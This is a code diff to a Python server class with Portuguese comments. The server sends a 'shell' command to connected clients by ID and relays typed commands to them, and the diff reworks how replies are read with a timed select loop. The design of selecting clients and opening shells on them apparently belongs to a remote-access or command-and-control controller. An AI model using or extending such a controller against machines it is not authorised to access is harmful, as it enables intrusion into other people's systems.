@@ -60,30 +60,22 @@ class Server:
             client_socket = client_info['socket']
             client_socket.send("shell".encode())  # Envie o comando "shell" para o cliente
 
-            def receive_output():
-                while True:
-                    response = client_socket.recv(4096).decode()
-                    if not response:
-                        break
-                    print(response)
-
-            output_thread = threading.Thread(target=receive_output)
-            output_thread.daemon = True
-            output_thread.start()
-
             while True:
                 command = input(f"Shell (ID {client_id}) >> ")
                 client_socket.send(command.encode())
                 if command.lower() == 'exit':
                     break
+
+                # Aguarda 1 segundo para a resposta
+                timeout = 1
+                start_time = time.time()
                 while True:
-                    ready = select.select([client_socket], [], [], 1) # Tempo de 1 segundos para liberar o prompt
+                    ready = select.select([client_socket], [], [], timeout)
                     if ready[0]:
-                        response = client_socket.recv(4096).decode()
-                        if response:
-                            print(response)
+                        response = client_socket.recv(99999).decode()
+                        print(response)
                         break
-                    else:
+                    elif time.time() - start_time >= timeout:
                         break
         else:
             print(f"Client with ID {client_id} not found.")
@@ -164,6 +156,7 @@ if __name__ == '__main__':
                         print("Invalid client ID.")
                 else:
                     print("Usage: use <client_id>")
+                    
             elif command[0] == 'execute':
                 if server.current_client_id is not None:
                     if len(command) >= 2:
